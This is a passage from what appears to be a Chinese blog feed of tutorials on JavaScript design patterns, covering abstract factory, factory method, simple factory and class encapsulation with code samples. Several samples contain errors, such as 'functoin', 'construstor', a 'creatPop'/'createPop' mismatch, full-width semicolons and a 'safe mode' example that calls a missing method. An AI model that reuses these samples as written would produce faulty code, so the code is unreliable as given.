id="more"></a><p>面向对象的语言里有抽象工厂模式，首先声明一个抽象类作为父类，以概括某一类产品所需要的特征，继承该父类的子类需要实现父类中声明的方法而实现父类中所声明的功能：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//抽象工厂方法</span></span><br><span class="line"><span class="keyword">var</span> VehicleFactory = <span class="function"><span class="keyword">function</span>(<span class="params">subType,superType</span>)</span>&#123;</span><br><span class="line"><span class="comment">//判断抽象工厂中是否有该抽象类</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> VehicleFactory[superType] === <span class="string">'function'</span>)&#123;</span><br><span class="line"><span class="comment">//缓存类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="comment">//继承父类的属性与方法</span></span><br><span class="line">F.prototype = <span class="keyword">new</span> VehicleFactory[superType]();</span><br><span class="line"><span class="comment">//将子类constructor指向子类</span></span><br><span class="line">subType.construstor = subType;</span><br><span class="line"><span class="comment">//子类原型继承父类</span></span><br><span class="line">subType.prototype = <span class="keyword">new</span> F();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//不存在该抽象类抛出错误</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'未创建该抽象类'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//小汽车抽象类</span></span><br><span class="line">VehicleFactory.Car = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.type = <span class="string">'car'</span>;</span><br><span class="line">&#125;;</span><br><span class="line">VehicleFactory.Car.prototype = &#123;</span><br><span class="line">getPrice : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    getSpeed : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//公交车抽象类</span></span><br><span class="line">VehicleFactory.Bus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.type = <span class="string">'bus'</span>;</span><br><span class="line">&#125;;</span><br><span class="line">VehicleFactory.Bus.prototype = &#123;</span><br><span class="line">getPrice : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    getSpeed : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//货车抽象类</span></span><br><span class="line">VehicleFactory.Truck = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.type = <span class="string">'truck'</span>;</span><br><span class="line">&#125;;</span><br><span class="line">VehicleFactory.Truck.prototype = &#123;</span><br><span class="line">getPrice : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    getSpeed : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'抽象方法不能调用'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>抽象工厂其实是实现子类继承父类的方法，对抽象工厂添加抽象类也很特殊，因为抽象工厂是个方法不需要实例化对象，故只需要一份，因此直接为对象添加类的属性即可，于是我们就可以通过点语法在抽象工厂上添加我们一会儿需要的三个汽车簇抽象类Car,Bus,Truck。那我们该如何使用呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//奔驰汽车子类</span></span><br><span class="line"><span class="keyword">var</span> BenzTruck = <span class="function"><span class="keyword">function</span>(<span class="params">price,trainLoad</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.price = price;</span><br><span class="line"><span class="keyword">this</span>.trainLoad = trainLoad;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抽象工厂实现对Truck抽象类的继承</span></span><br><span class="line">VehicleFactory(BenzTruck,<span class="string">'Truck'</span>)</span><br><span class="line">BenzTruck.prototype.getPrice = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.price;</span><br><span class="line">&#125;</span><br><span class="line">BenzTruck.prototype.getTrainload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.trainLoad;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">var</span> truck = <span class="keyword">new</span> BenzTruck(<span class="number">100000</span>,<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(truck.getPrice());     <span class="comment">//100000</span></span><br><span class="line"><span class="built_in">console</span>.log(truck.type);           <span class="comment">//truck</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工厂方法模式</title>
      <link href="2019/01/20/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"/>
      <url>2019/01/20/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h1><p>工厂方法模式（Factory Method）：通过对产品类的抽象使其创建业务主要负责用于创建多类产品的实例。</p><h1 id="场景再现"><a href="#场景再现" class="headerlink" title="场景再现"></a>场景再现</h1><p>如何投放一批广告资源：</p><ul><li>java,绿色字体</li><li>PHP，黄色字体，红色背景</li><li>JS，粉色背景…</li></ul><p>我们想到了昨天学习的简单工厂模式</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建Java学科类</span></span><br><span class="line"><span class="keyword">var</span> Java = <span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建PHP学科类</span></span><br><span class="line"><span class="keyword">var</span> Php = <span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建JavaScript学科类</span></span><br><span class="line"><span class="keyword">var</span> JavaScript = <span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.content = content;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">        div.innerHTML = content;</span><br><span class="line">        div.style.background = <span class="string">'pink'</span>;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>).appendChild(div);</span><br><span class="line">    &#125;)(content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//学科类工厂</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">JobFactory</span>(<span class="params">type,content</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(type)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'java'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Java(content);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'php'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Php(content);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'JavaScript'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JavaScript(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line">JobFactory(<span class="string">'JavaScript'</span>,<span class="string">'JavaScript哪家强'</span>);</span><br></pre></td></tr></table></figure><p>但是这种方法每当有新的需求时，我们不仅仅要添加类，而且还要修改工厂函数，我们这里可以使用安全的工厂方法，在这之前，我们先介绍一下安全模式类。</p><h1 id="安全模式类"><a href="#安全模式类" class="headerlink" title="安全模式类"></a>安全模式类</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不安全模式</span></span><br><span class="line"><span class="keyword">var</span> Demo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Demo.prototype = &#123;</span><br><span class="line">    show: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'成功获取'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> Demo();</span><br><span class="line">d.show();<span class="comment">//成功获取</span></span><br><span class="line"><span class="keyword">var</span> d = Demo();</span><br><span class="line">d.show();<span class="comment">//错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在构造函数开始时先判断当前对象this指代是不是类</span></span><br><span class="line"><span class="keyword">var</span> Demo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="keyword">this</span> <span class="keyword">instanceof</span> Demo))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Demo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> d = Demo();</span><br><span class="line">d.show();</span><br></pre></td></tr></table></figure><h1 id="安全的工厂方法"><a href="#安全的工厂方法" class="headerlink" title="安全的工厂方法"></a>安全的工厂方法</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安全模式创建的工厂类</span></span><br><span class="line"><span class="keyword">var</span> Factory = <span class="function"><span class="keyword">function</span>(<span class="params">type,content</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span> <span class="keyword">instanceof</span> Factory)&#123;</span><br><span class="line">        <span class="keyword">var</span> s = <span class="keyword">new</span> <span class="keyword">this</span>[type](content);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Factory(type,content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//工厂原型中设置创建所有类型数据对象的基类</span></span><br><span class="line">Factory.prototype = &#123;</span><br><span class="line">    Java : <span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    Php : <span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    UI : <span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    JavaScript : <span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">            div.innerHTML = content;</span><br><span class="line">            div.style.background = <span class="string">'pink'</span>;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>).appendChild(div);</span><br><span class="line">        &#125;)(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样我们以后如果想添加其他类，只需写在Factory这个工厂类的原型里面就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单工厂模式</title>
      <link href="2019/01/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
      <url>2019/01/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>简单工厂模式：又叫静态工厂方法，由一个工厂对象决定创建某一种产品对象类的实例。主要用来创建同一类对象。</p><h1 id="关于登录模块的需求"><a href="#关于登录模块的需求" class="headerlink" title="关于登录模块的需求"></a>关于登录模块的需求</h1><p>当用户名的内容不符合规定，警示框警示一句’用户名不能多于16个字母或数字’</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> LoginAlert = <span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.content = text;</span><br><span class="line">&#125;</span><br><span class="line">LoginAlert.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//显示警示框</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> userNameAlert = <span class="keyword">new</span> LoginAlert(<span class="string">'用户名不能多于16个字母或数字'</span>);</span><br><span class="line">userNameAlert.show();</span><br></pre></td></tr></table></figure><a id="more"></a><p>当密码不正确时，提示‘输入的密码不正确’</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可以用上面写好的类</span></span><br><span class="line"><span class="keyword">var</span> passwordAlert = <span class="keyword">new</span> LoginAlert(<span class="string">'输入的密码不正确'</span>);</span><br><span class="line">passwordAlert.show();</span><br></pre></td></tr></table></figure><p>当用户不存在时，提醒‘您的用户名不存在，请重新输入’,并且在警示框中添加一个按钮</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个新的类</span></span><br><span class="line"><span class="keyword">var</span> LoginConfirm = <span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.content = text;</span><br><span class="line">&#125;</span><br><span class="line">LoginConfirm.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//显示确认框</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> loginFailConfirm = <span class="keyword">new</span> LoginConfirm(<span class="string">'您的用户名不存在，请重新输入'</span>);</span><br><span class="line">loginFailConfirm.show();</span><br></pre></td></tr></table></figure><p>登录后给出一个自定义提示框</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//再添加一个新类</span></span><br><span class="line"><span class="keyword">var</span> LoginPrompt = <span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.content = text;</span><br><span class="line">&#125;</span><br><span class="line">LoginPrompt.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//显示提示框</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="简单工厂"><a href="#简单工厂" class="headerlink" title="简单工厂"></a>简单工厂</h1><p>以上写了LoginAlert，LoginConfirm，LoginPrompt三个类，我们可以将其封装在一个函数里，这样我只需要记住这个函数，然后通过这个函数就可以创建我需要的对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> PopFactory = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(name)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'alert'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> LoginAlert();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'confirm'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> LoginConfirm();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'prompt'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> LoginPrompt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这三个类有很多地方是相同的，是可以抽象提取出来用的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">creatPop</span>(<span class="params">type,text</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//创建一个对象，并对对象拓展属性和方法</span></span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">    o.content = text;</span><br><span class="line">    o.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//显示方法</span></span><br><span class="line">    &#125;；</span><br><span class="line">    <span class="keyword">if</span>(type == <span class="string">'alert'</span>)&#123;</span><br><span class="line">        <span class="comment">//警示框差异部分</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(type == <span class="string">'prompt'</span>)&#123;</span><br><span class="line">        <span class="comment">//提示框差异部分</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(type == <span class="string">'confirm'</span>)&#123;</span><br><span class="line">        <span class="comment">//确认框差异部分</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将对象返回</span></span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建警示框</span></span><br><span class="line"><span class="keyword">var</span> userNameAlert = createPop(<span class="string">'alert'</span>,<span class="string">'用户名只能是26个字母和数字'</span>)；</span><br></pre></td></tr></table></figure><h2 id="工厂模式：原料，加工，出厂"><a href="#工厂模式：原料，加工，出厂" class="headerlink" title="工厂模式：原料，加工，出厂"></a>工厂模式：原料，加工，出厂</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//工厂模式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createBook</span>(<span class="params">name,time,type</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>(); <span class="comment">//原料</span></span><br><span class="line">    o.name = name;        <span class="comment">//加工</span></span><br><span class="line">    o.time = time;</span><br><span class="line">    o.type = type;</span><br><span class="line">    o.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//返回对象</span></span><br><span class="line">    <span class="keyword">return</span> o;             <span class="comment">//出厂</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类似于构造函数，构造函数中只需把o.name改为this.name</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面向对象编程</title>
      <link href="2019/01/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
      <url>2019/01/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>JavaScript这种解释型的弱类型语言没有经典强类型语言中那种通过class等关键字实现类的封装方式，JavaScript中都是通过一些特性模仿实现的。</p><h1 id="如何创建一个类"><a href="#如何创建一个类" class="headerlink" title="如何创建一个类"></a>如何创建一个类</h1><p>首先声明一个函数保存在一个变量里，然后在这个函数（类）的内部通过this变量添加属性或者方法来实现对类添加属性或者方法。</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Book = functoin(id,bookname,price)&#123;</span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">    <span class="keyword">this</span>.bookname = bookname;</span><br><span class="line">    <span class="keyword">this</span>.price = price;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这样我们实现了封装，当使用功能方法时，我们不能直接使用这个Book类，需要用new关键字来实例化</span></span><br><span class="line"><span class="comment">//可以使用点语法访问实例化对象的属性和方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> book = <span class="keyword">new</span> Book(<span class="number">10</span>,<span class="string">'设计模式'</span>,<span class="number">50</span>);</span><br><span class="line"><span class="built_in">console</span>.log(book.bookname);<span class="comment">//设计模式</span></span><br></pre></td></tr></table></figure><h1 id="属性与方法的封装"><a href="#属性与方法的封装" class="headerlink" title="属性与方法的封装"></a>属性与方法的封装</h1><p>由于JavaScript的函数级作用域，声明在函数内部的变量以及方法在外界是访问不到的：私有变量，私有方法</p><p>函数内部通过this创建的属性可看做是对象的：共有属性，共有方法</p><p>而通过this创建的方法，不但可以访问到对象的共有属性与共有方法，而且还能访问到私有属性和私有方法，可以看做：特权方法</p><p>在对象创建时通过这些特权方法可以初始化实例对象的一些属性：构造器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Book = <span class="function"><span class="keyword">function</span>(<span class="params">id,name,price</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//私有属性</span></span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//私有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkId</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//特权方法</span></span><br><span class="line">    <span class="keyword">this</span>.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">this</span>.getPrice = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">this</span>.setName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">this</span>.setPrice = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="comment">//对象公有属性</span></span><br><span class="line">    <span class="keyword">this</span>.copy = <span class="function"><span class="keyword">function</span>(<span 